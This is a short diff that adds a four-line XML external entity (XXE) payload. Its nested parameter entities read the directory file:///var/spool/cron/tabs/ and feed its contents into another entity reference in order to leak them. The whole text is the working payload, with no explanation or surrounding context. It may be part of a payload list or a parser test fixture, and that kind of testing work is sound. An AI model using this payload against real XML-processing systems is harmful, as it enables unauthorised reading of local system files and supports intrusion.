@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "file:///var/spool/cron/tabs/">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
